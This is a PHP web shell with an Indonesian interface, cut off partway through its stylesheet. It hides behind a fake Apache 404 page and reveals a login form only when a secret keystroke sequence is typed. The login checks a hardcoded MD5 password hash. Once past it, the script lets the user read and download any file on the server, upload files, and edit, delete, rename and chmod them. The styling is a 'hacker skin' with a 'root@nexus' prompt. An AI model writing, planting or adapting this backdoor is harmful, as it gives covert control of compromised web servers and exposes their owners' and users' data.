<?php
@session_start();
@ini_set('display_errors', '0');
error_reporting(E_ALL);

$passwordHash = 'e6c637b162c293151d6b3a05f3a5c5be';
$loginGate = 'toku1337';
$sessionTimeout = 1800;
$pageSize = 25;
$defaultPath = dirname(__FILE__);

function e($value) {
    return htmlspecialchars((string) $value, ENT_QUOTES, 'UTF-8');
}

function joinPath($base, $name) {
    return rtrim($base, '/\\') . DIRECTORY_SEPARATOR . $name;
}

function safeName($name) {
    $name = basename(str_replace('\\', '/', trim((string) $name)));
    return ($name === '' || $name === '.' || $name === '..' || strpos($name, "\0") !== false) ? false : $name;
}

function formatSize($bytes) {
    $bytes = (float) $bytes;
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $index = 0;
    while ($bytes >= 1024 && $index < count($units) - 1) {
        $bytes /= 1024;
        $index++;
    }
    return ($index === 0 ? (int) $bytes : number_format($bytes, 1)) . ' ' . $units[$index];
}

function permissionOctal($path) {
    $permission = @fileperms($path);
    return $permission === false ? '----' : substr(sprintf('%o', $permission), -4);
}

function removeItem($path) {
    if (is_link($path) || is_file($path)) {
        return @unlink($path);
    }
    if (!is_dir($path)) {
        return false;
    }
    $items = @scandir($path);
    if ($items === false) {
        return false;
    }
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        if (!removeItem(joinPath($path, $item))) {
            return false;
        }
    }
    return @rmdir($path);
}

function setFlash($type, $message) {
    $_SESSION['flash'] = array('type' => $type, 'message' => $message);
}

function redirectTo($path) {
    header('Location: ?path=' . rawurlencode($path));
    exit;
}

function fileIcon($name, $isDirectory) {
    if ($isDirectory) {
        return 'folder';
    }
    $extension = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    if (in_array($extension, array('jpg', 'jpeg', 'png', 'gif', 'webp', 'svg'))) return 'image';
    if (in_array($extension, array('zip', 'rar', '7z', 'tar', 'gz'))) return 'archive';
    if (in_array($extension, array('php', 'js', 'css', 'html', 'htm', 'json', 'xml', 'py', 'java'))) return 'code';
    if (in_array($extension, array('mp3', 'wav', 'ogg', 'flac'))) return 'audio';
    if (in_array($extension, array('mp4', 'webm', 'mov', 'avi'))) return 'video';
    if ($extension === 'pdf') return 'pdf';
    return 'file';
}

if (isset($_GET['logout'])) {
    $_SESSION = array();
    if (ini_get('session.use_cookies')) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $params['path'], $params['domain'], $params['secure'], $params['httponly']);
    }
    @session_destroy();
    header('Location: ?');
    exit;
}

if (!empty($_SESSION['logged_in']) && isset($_SESSION['last_activity']) && time() - $_SESSION['last_activity'] > $sessionTimeout) {
    $_SESSION = array();
    $loginError = 'Sesi berakhir. Silakan masuk kembali.';
}

$gateVisible = isset($_POST['login_password']);
$serverSoftware = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Apache';
$serverName = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost';
$serverPort = isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : '80';

if (isset($_POST['login_password'])) {
    if (md5((string) $_POST['login_password']) === $passwordHash) {
        @session_regenerate_id(true);
        $_SESSION['logged_in'] = true;
        $_SESSION['last_activity'] = time();
        $_SESSION['csrf'] = md5(uniqid(mt_rand(), true));
        header('Location: ?');
        exit;
    }
    $loginError = 'Password yang dimasukkan salah.';
}

if (empty($_SESSION['logged_in'])) {
    if (!$gateVisible) http_response_code(404);
?>
<!doctype html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title><?php echo $gateVisible ? 'Masuk · File Manager' : '404 Not Found'; ?></title>
    <link rel="icon" href="data:,">
    <style>
        *{box-sizing:border-box}:root{color-scheme:dark;--green:#00ff88;--dim:#0b673f}
        body{margin:0;min-height:100vh;display:grid;place-items:center;padding:24px;overflow:hidden;background:#010403;color:var(--green);font:14px/1.6 "Cascadia Code","Fira Code",Consolas,monospace;background-image:linear-gradient(rgba(0,255,136,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.025) 1px,transparent 1px);background-size:34px 34px}
        body:before{content:"";position:fixed;inset:0;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(0,0,0,0),rgba(0,0,0,0) 2px,rgba(0,255,80,.035) 3px);animation:scan 9s linear infinite}body:after{content:"";position:fixed;width:720px;height:420px;border-radius:50%;background:rgba(0,255,100,.09);filter:blur(140px);pointer-events:none}
        .login{position:relative;width:min(470px,100%);padding:32px;border:1px solid #0b673f;border-radius:3px;background:rgba(0,8,5,.94);box-shadow:0 0 0 1px #031b11,0 0 45px rgba(0,255,105,.1),inset 0 0 40px rgba(0,255,100,.025)}
        .login:before{content:"SECURE_CHANNEL // AES-256";display:block;margin:-16px 0 26px;color:#367b5b;font-size:10px;letter-spacing:.18em}.login:after{content:"";position:absolute;inset:7px;border:1px solid rgba(0,255,136,.07);pointer-events:none}
        .logo{display:grid;place-items:center;width:48px;height:48px;margin-bottom:20px;border:1px solid var(--green);border-radius:2px;background:#02150d;color:var(--green);box-shadow:0 0 20px rgba(0,255,136,.18);font-size:24px;text-shadow:0 0 12px var(--green)}
        h1{margin:0 0 8px;font-size:23px;letter-spacing:.06em;text-transform:uppercase;text-shadow:0 0 12px rgba(0,255,136,.45)}h1:before{content:"> "}p{margin:0 0 25px;color:#4f9b76;font-size:12px}
        label{display:block;margin-bottom:7px;color:#66c695;font-size:11px;font-weight:700;letter-spacing:.11em;text-transform:uppercase}label:before{content:"$ "}
        input{width:100%;height:46px;padding:0 13px;border:1px solid #124a32;border-radius:2px;background:#000704;color:#9fffc9;font:inherit;outline:none;caret-color:var(--green)}input:focus{border-color:var(--green);box-shadow:0 0 0 2px rgba(0,255,136,.1),0 0 18px rgba(0,255,136,.08)}
        button{width:100%;height:46px;margin-top:14px;border:1px solid var(--green);border-radius:2px;background:#001b10;color:var(--green);font:inherit;font-weight:800;letter-spacing:.08em;text-transform:uppercase;cursor:pointer;box-shadow:inset 0 0 18px rgba(0,255,136,.05)}button:hover{background:var(--green);color:#00150b;box-shadow:0 0 24px rgba(0,255,136,.28)}
        .error{margin:0 0 18px;padding:10px 12px;border:1px solid #ff3158;border-radius:2px;background:rgba(80,0,18,.28);color:#ff6b87;font-size:12px}.error:before{content:"[DENIED] "}
        @keyframes scan{to{transform:translateY(12px)}}
        /* restrained dark style */
        body{background:linear-gradient(rgba(3,7,5,.72),rgba(3,7,5,.88)),url('assets/file-manager-bg.png') center/cover fixed;color:#d9e0db;font:14px/1.6 ui-monospace,SFMono-Regular,Consolas,"Liberation Mono",monospace}body:before,body:after{display:none}
        .login{padding:34px;border:1px solid rgba(111,148,123,.3);border-radius:10px;background:rgba(13,18,15,.88);box-shadow:0 24px 80px rgba(0,0,0,.55);backdrop-filter:blur(14px)}.login:before,.login:after{display:none}
        .logo{width:44px;height:44px;margin-bottom:24px;border:1px solid #334039;border-radius:7px;background:#151b17;color:#71d58f;box-shadow:none;font-size:15px;font-weight:700;text-shadow:none}
        h1{margin-bottom:6px;color:#eef3ef;font-size:22px;letter-spacing:-.02em;text-transform:none;text-shadow:none}h1:before{content:none}p{color:#758078;font-size:13px}
        label{color:#909b93;font-size:12px;letter-spacing:0;text-transform:none}label:before{content:none}
        input{border-color:#2c3730;border-radius:7px;background:#0b0e0c;color:#e3e9e4;caret-color:#65cf85}input:focus{border-color:#4c8d60;box-shadow:0 0 0 3px rgba(101,207,133,.1)}
        button{border:1px solid #4b9c63;border-radius:7px;background:#173c23;color:#a5eab9;letter-spacing:0;text-transform:none;box-shadow:none}button:hover{background:#1f4b2c;color:#d2f7dc;box-shadow:none}
        .error{border-color:#5b2b31;border-radius:7px;background:#251216;color:#ef9aa5}.error:before{content:none}
        /* graphite + cyan palette */
        body{background:linear-gradient(rgba(5,9,13,.76),rgba(5,9,13,.9)),url('assets/file-manager-bg.png') center/cover fixed;color:#d8e4e8}
        .login{border-color:rgba(102,153,168,.32);background:rgba(11,17,21,.9)}
        .logo{border-color:#334850;background:#121c21;color:#69bcc9}
        h1{color:#edf5f7}p{color:#71858d}label{color:#92a5ac}
        input{border-color:#30434a;background:#091014;color:#e1ecef;caret-color:#63b6c3}input:focus{border-color:#5799a5;box-shadow:0 0 0 3px rgba(87,153,165,.12)}
        button{border-color:#4c919c;background:#17353b;color:#a7dce3}button:hover{background:#20444b;color:#d5f2f5}
        .not-found{display:block;position:fixed;inset:8px 8px auto 8px;width:auto;max-width:none;margin:0;color:#000;text-align:left!important;font:medium serif}.not-found h1{display:block;margin:.67em 0;color:#000;text-align:left!important;font:bold 2em serif;letter-spacing:normal;text-transform:none;text-shadow:none}.not-found h1:before{content:none}.not-found p{display:block;margin:1em 0;color:#000;text-align:left!important;font:medium serif}.not-found hr{display:block;width:100%;margin:.5em 0;border-style:inset;border-width:1px}.not-found address{display:block;text-align:left!important;font-style:italic}.login{display:none}body:not(.gate-open){display:block;margin:0;padding:0;background:#fff;color:#000;text-align:left!important;font:medium serif}body:not(.gate-open):before,body:not(.gate-open):after{display:none}body.gate-open{place-items:center;padding:24px}body.gate-open .not-found{display:none}body.gate-open .login{display:block}@media(max-width:600px){body.gate-open{padding:18px}.login{width:100%}}
    </style>
</head>
<body<?php if ($gateVisible) echo ' class="gate-open"'; ?>>
    <main class="not-found" id="notFound"><h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address><?php echo e($serverSoftware); ?> Server at <?php echo e($serverName); ?> Port <?php echo e($serverPort); ?></address></main>
    <main class="login">
        <div class="logo">~/</div>
        <h1>File Manager</h1>
        <p>Masuk untuk melanjutkan.</p>
        <?php if (!empty($loginError)) { ?><div class="error"><?php echo e($loginError); ?></div><?php } ?>
        <form method="post">
            <label for="password">Password</label>
            <input id="password" type="password" name="login_password" placeholder="Masukkan password" required<?php if ($gateVisible) echo ' autofocus'; ?>>
            <button type="submit">Masuk</button>
        </form>
    </main>
    <script>(function(){var target=<?php echo json_encode($loginGate); ?>,typed='';addEventListener('keydown',function(event){if(event.ctrlKey||event.altKey||event.metaKey||event.key.length!==1)return;typed=(typed+event.key.toLowerCase()).slice(-target.length);if(typed===target){document.body.className='gate-open';document.title='Masuk · File Manager';document.getElementById('password').focus();}});}());</script>
</body>
</html>
<?php
    exit;
}

$_SESSION['last_activity'] = time();
if (empty($_SESSION['csrf'])) {
    $_SESSION['csrf'] = md5(uniqid(mt_rand(), true));
}
$csrf = $_SESSION['csrf'];

$requestedPath = isset($_REQUEST['path']) && is_string($_REQUEST['path']) ? $_REQUEST['path'] : $defaultPath;
$basePath = @realpath($requestedPath);
if ($basePath === false || !is_dir($basePath) || !is_readable($basePath)) {
    $basePath = @realpath($defaultPath);
}

if (isset($_GET['download']) && is_string($_GET['download'])) {
    $download = @realpath($_GET['download']);
    if ($download && is_file($download) && is_readable($download)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . str_replace('"', '', basename($download)) . '"');
        header('Content-Length: ' . @filesize($download));
        @readfile($download);
    }
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    if (!isset($_POST['csrf']) || !hash_equals($csrf, (string) $_POST['csrf'])) {
        setFlash('error', 'Permintaan tidak valid. Muat ulang halaman lalu coba lagi.');
        redirectTo($basePath);
    }

    $action = $_POST['action'];
    $success = false;
    $message = 'Aksi gagal dijalankan.';

    if ($action === 'upload' && isset($_FILES['upload_files'])) {
        $uploaded = 0;
        $names = $_FILES['upload_files']['name'];
        foreach ($names as $index => $originalName) {
            $name = safeName($originalName);
            if ($name && $_FILES['upload_files']['error'][$index] === UPLOAD_ERR_OK) {
                if (@move_uploaded_file($_FILES['upload_files']['tmp_name'][$index], joinPath($basePath, $name))) {
                    $uploaded++;
                }
            }
        }
        $success = $uploaded > 0;
        $message = $success ? $uploaded . ' file berhasil diunggah.' : 'Tidak ada file yang berhasil diunggah.';
    } elseif ($action === 'mkdir') {
        $name = safeName(isset($_POST['folder_name']) ? $_POST['folder_name'] : '');
        $success = $name && !file_exists(joinPath($basePath, $name)) && @mkdir(joinPath($basePath, $name));
        $message = $success ? 'Folder berhasil dibuat.' : 'Folder gagal dibuat atau namanya sudah digunakan.';
    } elseif ($action === 'create_file') {
        $name = safeName(isset($_POST['filename']) ? $_POST['filename'] : '');
        $target = $name ? joinPath($basePath, $name) : false;
        $success = $target && !file_exists($target) && @file_put_contents($target, isset($_POST['filecontent']) ? $_POST['filecontent'] : '') !== false;
        $message = $success ? 'File berhasil dibuat.' : 'File gagal dibuat atau namanya sudah digunakan.';
    } elseif ($action === 'rename') {
        $oldName = safeName(isset($_POST['old_name']) ? $_POST['old_name'] : '');
        $newName = safeName(isset($_POST['new_name']) ? $_POST['new_name'] : '');
        $oldPath = $oldName ? @realpath(joinPath($basePath, $oldName)) : false;
        $newPath = $newName ? joinPath($basePath, $newName) : false;
        $success = $oldPath && $newPath && !file_exists($newPath) && @rename($oldPath, $newPath);
        $message = $success ? 'Nama berhasil diubah.' : 'Nama gagal diubah atau sudah digunakan.';
    } elseif ($action === 'delete') {
        $name = safeName(isset($_POST['target']) ? $_POST['target'] : '');
        $target = $name ? @realpath(joinPath($basePath, $name)) : false;
        $success = $target && $target !== @realpath(__FILE__) && removeItem($target);
        $message = $success ? 'Item berhasil dihapus.' : 'Item gagal dihapus.';
    } elseif ($action === 'save') {
        $target = isset($_POST['edit_target']) ? @realpath($_POST['edit_target']) : false;
        $success = $target && is_file($target) && $target !== @realpath(__FILE__) && @file_put_contents($target, isset($_POST['content']) ? $_POST['content'] : '') !== false;
        $message = $success ? 'Perubahan file berhasil disimpan.' : 'File gagal disimpan.';
    } elseif ($action === 'chmod') {
        $name = safeName(isset($_POST['target']) ? $_POST['target'] : '');
        $permission = isset($_POST['permission']) ? trim($_POST['permission']) : '';
        $target = $name ? @realpath(joinPath($basePath, $name)) : false;
        $success = $target && preg_match('/^[0-7]{3,4}$/', $permission) && @chmod($target, octdec($permission));
        $message = $success ? 'Permission berhasil diperbarui.' : 'Permission gagal diperbarui.';
    }

    setFlash($success ? 'success' : 'error', $message);
    redirectTo($basePath);
}

$editPath = isset($_GET['edit']) && is_string($_GET['edit']) ? @realpath($_GET['edit']) : false;
$editMode = $editPath && is_file($editPath) && is_readable($editPath) && @filesize($editPath) <= 2097152;
$editContent = $editMode ? @file_get_contents($editPath) : '';

$items = @scandir($basePath);
if ($items === false) $items = array();
$query = isset($_GET['q']) ? trim($_GET['q']) : '';
$sort = isset($_GET['sort']) && in_array($_GET['sort'], array('name', 'size', 'time')) ? $_GET['sort'] : 'name';
$entries = array();
$folderCount = 0;
$fileCount = 0;

foreach ($items as $name) {
    if ($name === '.' || $name === '..') continue;
    $path = joinPath($basePath, $name);
    $isDirectory = is_dir($path);
    if ($isDirectory) $folderCount++; else $fileCount++;
    if ($query !== '' && stripos($name, $query) === false) continue;
    $entries[] = array(
        'name' => $name,
        'path' => $path,
        'directory' => $isDirectory,
        'size' => $isDirectory ? 0 : (float) @filesize($path),
        'time' => (int) @filemtime($path),
        'permission' => permissionOctal($path),
        'writable' => is_writable($path)
    );
}

usort($entries, function ($a, $b) use ($sort) {
    if ($a['directory'] !== $b['directory']) return $a['directory'] ? -1 : 1;
    if ($sort === 'size' && $a['size'] !== $b['size']) return $a['size'] < $b['size'] ? -1 : 1;
    if ($sort === 'time' && $a['time'] !== $b['time']) return $a['time'] < $b['time'] ? -1 : 1;
    return strcasecmp($a['name'], $b['name']);
});

$totalItems = count($entries);
$totalPages = max(1, (int) ceil($totalItems / $pageSize));
$page = isset($_GET['page']) ? max(1, min($totalPages, (int) $_GET['page'])) : 1;
$entries = array_slice($entries, ($page - 1) * $pageSize, $pageSize);

$breadcrumbs = array();
$normalizedPath = str_replace('\\', '/', $basePath);
if (preg_match('/^[A-Za-z]:/', $normalizedPath)) {
    $segments = explode('/', $normalizedPath);
    $current = array_shift($segments) . DIRECTORY_SEPARATOR;
    $breadcrumbs[] = array('name' => rtrim($current, DIRECTORY_SEPARATOR), 'path' => $current);
} else {
    $segments = explode('/', trim($normalizedPath, '/'));
    $current = '/';
    $breadcrumbs[] = array('name' => '/', 'path' => '/');
}
foreach ($segments as $segment) {
    if ($segment === '') continue;
    $current = rtrim($current, '/\\') . DIRECTORY_SEPARATOR . $segment;
    $breadcrumbs[] = array('name' => $segment, 'path' => $current);
}

$flash = isset($_SESSION['flash']) ? $_SESSION['flash'] : false;
unset($_SESSION['flash']);

function queryUrl($path, $params) {
    return '?' . http_build_query(array_merge(array('path' => $path), $params));
}
?>
<!doctype html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>File Manager</title>
    <link rel="icon" href="data:,">
    <style>
        *{box-sizing:border-box} :root{color-scheme:dark;--bg:#070b17;--panel:#0d1424;--panel2:#111a2d;--line:#202c43;--text:#edf2ff;--muted:#8190aa;--violet:#8b5cf6;--cyan:#22d3ee;--red:#fb7185;--green:#34d399}
        html{scroll-behavior:smooth} body{margin:0;min-height:100vh;background:radial-gradient(circle at 8% 0%,rgba(124,58,237,.16),transparent 32%),radial-gradient(circle at 92% 12%,rgba(6,182,212,.12),transparent 30%),var(--bg);color:var(--text);font:14px/1.5 Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",sans-serif}
        button,input,textarea{font:inherit} a{color:inherit}.topbar{position:sticky;top:0;z-index:40;border-bottom:1px solid rgba(255,255,255,.07);background:rgba(7,11,23,.82);backdrop-filter:blur(20px)}
        .topbar-inner{width:min(1480px,100%);height:68px;margin:auto;padding:0 24px;display:flex;align-items:center;justify-content:space-between}.brand{display:flex;align-items:center;gap:12px}.brand-mark{display:grid;place-items:center;width:38px;height:38px;border-radius:12px;background:linear-gradient(135deg,var(--violet),#4f46e5 52%,var(--cyan));box-shadow:0 10px 30px rgba(99,102,241,.28);font-size:18px}.brand strong{display:block;font-size:16px;letter-spacing:-.02em}.brand small{display:block;color:var(--muted);font-size:11px}.logout{padding:8px 12px;border:1px solid var(--line);border-radius:10px;color:#b7c2d8;text-decoration:none;font-weight:700}.logout:hover{border-color:rgba(251,113,133,.45);color:#fda4af;background:rgba(127,29,29,.15)}
        .shell{width:min(1480px,100%);margin:auto;padding:28px 24px 42px}.breadcrumbs{display:flex;align-items:center;gap:6px;overflow:auto;padding:4px 0 18px;color:var(--muted);white-space:nowrap}.breadcrumbs a{padding:5px 8px;border-radius:7px;text-decoration:none;font-weight:650}.breadcrumbs a:hover,.breadcrumbs a:last-of-type{background:rgba(139,92,246,.12);color:#c4b5fd}.separator{color:#43506a}
        .hero{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;margin-bottom:20px}.eyebrow{margin:0 0 5px;color:var(--cyan);font-size:11px;font-weight:800;letter-spacing:.13em;text-transform:uppercase}.hero h1{max-width:820px;margin:0;font-size:clamp(25px,4vw,38px);letter-spacing:-.045em;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.hero-path{margin:7px 0 0;color:var(--muted);font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:12px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.status{display:inline-flex;align-items:center;gap:8px;padding:8px 11px;border:1px solid rgba(52,211,153,.2);border-radius:999px;background:rgba(6,78,59,.17);color:#6ee7b7;font-size:12px;font-weight:800}.status:before{content:"";width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 12px var(--green)}
        .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:16px}.stat{position:relative;overflow:hidden;padding:17px 18px;border:1px solid var(--line);border-radius:15px;background:linear-gradient(145deg,rgba(17,26,45,.94),rgba(10,16,31,.94));box-shadow:0 16px 40px rgba(0,0,0,.14)}.stat:after{content:"";position:absolute;right:-24px;top:-26px;width:86px;height:86px;border-radius:50%;background:var(--glow);filter:blur(26px);opacity:.23}.stat span{display:block;color:var(--muted);font-size:11px;font-weight:800;letter-spacing:.08em;text-transform:uppercase}.stat strong{display:block;margin-top:5px;font-size:24px;letter-spacing:-.04em}
        .toolbar{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:16px;padding:12px;border:1px solid var(--line);border-radius:15px;background:rgba(13,20,36,.9);box-shadow:0 16px 40px rgba(0,0,0,.14)}.tools{display:flex;flex-wrap:wrap;gap:8px}.button{display:inline-flex;align-items:center;justify-content:center;gap:7px;min-height:38px;padding:8px 12px;border:1px solid var(--line);border-radius:10px;background:#111a2d;color:#cbd5e1;text-decoration:none;font-weight:750;cursor:pointer}.button:hover{border-color:#465675;background:#172238;color:#fff;transform:translateY(-1px)}.button.primary{border-color:transparent;background:linear-gradient(135deg,var(--violet),#6366f1);color:#fff;box-shadow:0 10px 24px rgba(99,102,241,.2)}.button.danger{color:#fda4af}.search{display:flex;gap:8px;min-width:min(420px,100%)}.search input{width:100%;height:38px;padding:0 12px;border:1px solid var(--line);border-radius:10px;background:#080e1c;color:var(--text);outline:none}.search input:focus,.field:focus{border-color:var(--violet);box-shadow:0 0 0 3px rgba(139,92,246,.14)}
        .panel{overflow:hidden;border:1px solid var(--line);border-radius:16px;background:rgba(13,20,36,.92);box-shadow:0 24px 60px rgba(0,0,0,.18)}.panel-head{display:flex;align-items:center;justify-content:space-between;padding:15px 17px;border-bottom:1px solid var(--line)}.panel-head strong{font-size:13px}.panel-head span{color:var(--muted);font-size:12px}.table-wrap{overflow:auto}table{width:100%;min-width:960px;border-collapse:collapse}th{padding:11px 14px;background:#0a1120;color:#71809b;font-size:10px;letter-spacing:.09em;text-align:left;text-transform:uppercase}td{padding:12px 14px;border-top:1px solid rgba(32,44,67,.72);color:#aebbd1}tbody tr:hover{background:rgba(139,92,246,.045)}.name-cell{display:flex;align-items:center;gap:11px;min-width:270px}.file-icon{display:grid;place-items:center;flex:0 0 38px;height:38px;border:1px solid #263653;border-radius:11px;background:#111b31;color:#9cabff;font-size:18px}.file-icon.folder{color:#fbbf24;background:rgba(120,53,15,.16)}.file-icon.image{color:#67e8f9}.file-icon.code{color:#c4b5fd}.file-icon.archive{color:#fda4af}.file-name{min-width:0}.file-name a,.file-name strong{display:block;max-width:390px;overflow:hidden;color:#e7ecf8;font-weight:720;text-decoration:none;text-overflow:ellipsis;white-space:nowrap}.file-name a:hover{color:#a78bfa}.file-name small{color:#64748b}.permission{font-family:ui-monospace,SFMono-Regular,Consolas,monospace;color:#93a4c2}.actions{display:flex;justify-content:flex-end;gap:5px}.icon-button{display:grid;place-items:center;min-width:31px;height:31px;padding:0 8px;border:1px solid transparent;border-radius:8px;background:transparent;color:#8291aa;text-decoration:none;cursor:pointer}.icon-button:hover{border-color:var(--line);background:#151f33;color:#fff}.icon-button.delete:hover{color:#fb7185;background:rgba(127,29,29,.16)}.empty{padding:56px 20px;text-align:center;color:var(--muted)}
        .toast{display:flex;align-items:center;justify-content:space-between;gap:14px;margin-bottom:16px;padding:12px 14px;border:1px solid;border-radius:12px;font-weight:650}.toast.success{border-color:rgba(52,211,153,.25);background:rgba(6,78,59,.17);color:#6ee7b7}.toast.error{border-color:rgba(251,113,133,.25);background:rgba(127,29,29,.17);color:#fda4af}.toast button{border:0;background:none;color:inherit;font-size:18px;cursor:pointer}.pagination{display:flex;justify-content:center;gap:6px;margin-top:18px}.pagination a,.pagination span{display:grid;place-items:center;min-width:36px;height:36px;padding:0 8px;border:1px solid var(--line);border-radius:9px;color:#94a3b8;text-decoration:none}.pagination a:hover,.pagination .active{border-color:#7c3aed;background:#6d28d9;color:#fff}
        .editor{margin-bottom:16px}.editor textarea{display:block;width:100%;min-height:480px;padding:18px;border:0;border-bottom:1px solid var(--line);resize:vertical;background:#070d19;color:#dbeafe;font:13px/1.65 ui-monospace,SFMono-Regular,Consolas,monospace;outline:none;tab-size:4}.editor-actions{display:flex;justify-content:flex-end;gap:8px;padding:12px}
        dialog{width:min(520px,calc(100% - 28px));padding:0;border:1px solid #293650;border-radius:18px;background:#0d1424;color:var(--text);box-shadow:0 35px 100px rgba(0,0,0,.62)}dialog::backdrop{background:rgba(2,6,23,.76);backdrop-filter:blur(5px)}.dialog-head{display:flex;align-items:center;justify-content:space-between;padding:17px 19px;border-bottom:1px solid var(--line)}.dialog-head h2{margin:0;font-size:17px}.dialog-close{border:0;background:none;color:#71809b;font-size:22px;cursor:pointer}.dialog-body{padding:19px}.dialog-actions{display:flex;justify-content:flex-end;gap:8px;padding:0 19px 19px}.label{display:block;margin-bottom:7px;color:#aebbd1;font-size:12px;font-weight:800}.field{width:100%;min-height:43px;padding:10px 12px;border:1px solid var(--line);border-radius:10px;background:#080e1c;color:#edf2ff;outline:none}.field+ .label{margin-top:14px}textarea.field{min-height:120px;resize:vertical}.dropzone{padding:32px 18px;border:1.5px dashed #3a4966;border-radius:13px;background:#090f1d;color:#8291aa;text-align:center}.dropzone.dragging{border-color:var(--cyan);background:rgba(8,145,178,.08);color:#67e8f9}.dropzone strong{display:block;margin-bottom:4px;color:#dbe4f5}.dropzone input{max-width:100%;margin-top:15px}
        .footer{padding:22px 0 4px;color:#526079;text-align:center;font-size:11px}
        @media(max-width:880px){.shell{padding:20px 13px 30px}.topbar-inner{padding:0 14px}.hero{align-items:flex-start;flex-direction:column}.stats{grid-template-columns:1fr 1fr}.stats .stat:last-child{grid-column:1/-1}.toolbar{align-items:stretch;flex-direction:column}.search{min-width:0}.hide-mobile{display:none}table{min-width:670px}.hero h1{font-size:27px}}
        @media(max-width:520px){.tools{display:grid;grid-template-columns:1fr 1fr}.button{width:100%}.stats{grid-template-columns:1fr}.stats .stat:last-child{grid-column:auto}.brand small{display:none}}

        /* NEXUS hacker skin */
        :root{--bg:#010403;--panel:#030a07;--panel2:#05100b;--line:#103b29;--text:#b7ffd5;--muted:#4f8a6b;--violet:#00ff88;--cyan:#00ff88;--red:#ff3158;--green:#00ff88}
        body{background-color:#010403;background-image:linear-gradient(rgba(0,255,136,.022) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.022) 1px,transparent 1px),radial-gradient(circle at 50% -20%,rgba(0,255,100,.11),transparent 38%);background-size:32px 32px,32px 32px,auto;color:var(--text);font-family:"Cascadia Code","Fira Code",Consolas,"Courier New",monospace}
        body:before{content:"";position:fixed;z-index:1000;inset:0;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,100,.025) 3px);animation:screenScan 10s linear infinite}
        body:after{content:"";position:fixed;z-index:-1;top:-240px;left:50%;width:900px;height:500px;transform:translateX(-50%);border-radius:50%;background:rgba(0,255,100,.07);filter:blur(140px);pointer-events:none}
        .topbar{border-bottom:1px solid #0b5b38;background:rgba(0,5,3,.92);box-shadow:0 0 28px rgba(0,255,100,.06);backdrop-filter:blur(12px)}
        .topbar-inner{height:62px}.brand{gap:11px}.brand-mark{width:36px;height:36px;border:1px solid var(--green);border-radius:2px;background:#001a0e;color:var(--green);box-shadow:0 0 18px rgba(0,255,136,.18);text-shadow:0 0 10px var(--green)}.brand strong{color:#7dffb3;font-size:15px;letter-spacing:.08em;text-shadow:0 0 10px rgba(0,255,136,.32)}.brand small{color:#327653;letter-spacing:.1em;text-transform:uppercase}
        .logout{border-color:#194530;border-radius:2px;background:#020805;color:#5faf7f;font-size:11px;letter-spacing:.08em;text-transform:uppercase}.logout:before{content:"[ "}.logout:after{content:" ]"}.logout:hover{border-color:var(--red);background:rgba(80,0,18,.2);color:#ff718c;box-shadow:0 0 16px rgba(255,49,88,.1)}
        .shell{padding-top:22px}.breadcrumbs{margin-bottom:16px;padding:9px 12px;border:1px solid #0c3c28;background:rgba(1,9,5,.75);color:#397f5b;font-size:11px}.breadcrumbs:before{content:"root@nexus:";color:var(--green);font-weight:800}.breadcrumbs a{padding:2px 4px;border-radius:1px;color:#56aa79}.breadcrumbs a:hover,.breadcrumbs a:last-of-type{background:#003d22;color:#8fffc0;text-shadow:0 0 8px rgba(0,255,136,.35)}.separator{color:#1d5c3c}
        .hero{align-items:center;padding:19px 20px;border-left:2px solid var(--green);background:linear-gradient(90deg,rgba(0,255,136,.055),transparent 70%)}.eyebrow{color:#3e9466;letter-spacing:.18em}.eyebrow:before{content:"[ "}.eyebrow:after{content:" ]"}.hero h1{color:#adffce;font-size:clamp(23px,3vw,34px);letter-spacing:.015em;text-shadow:0 0 18px rgba(0,255,136,.16)}.hero h1:before{content:"> ";color:var(--green)}.hero-path{color:#3d835d}.hero-path:before{content:"PWD=";color:#1ed875}
        .status{border-color:#12683f;border-radius:2px;background:#00160c;color:#4dff9a;letter-spacing:.08em;text-transform:uppercase;box-shadow:inset 0 0 14px rgba(0,255,136,.035)}.status:before{border-radius:1px;animation:blink 1.4s steps(2,end) infinite}
        .stats{gap:9px}.stat{padding:14px 16px;border-color:#103b29;border-radius:2px;background:linear-gradient(135deg,#030b07,#010503);box-shadow:inset 0 0 24px rgba(0,255,100,.018)}.stat:before{content:"+";position:absolute;top:2px;left:5px;color:#17613e;font-size:10px}.stat:after{right:-10px;top:-38px;opacity:.1}.stat span{color:#377c58;font-size:10px;letter-spacing:.14em}.stat strong{color:#72ffad;font-weight:500;text-shadow:0 0 12px rgba(0,255,136,.28)}
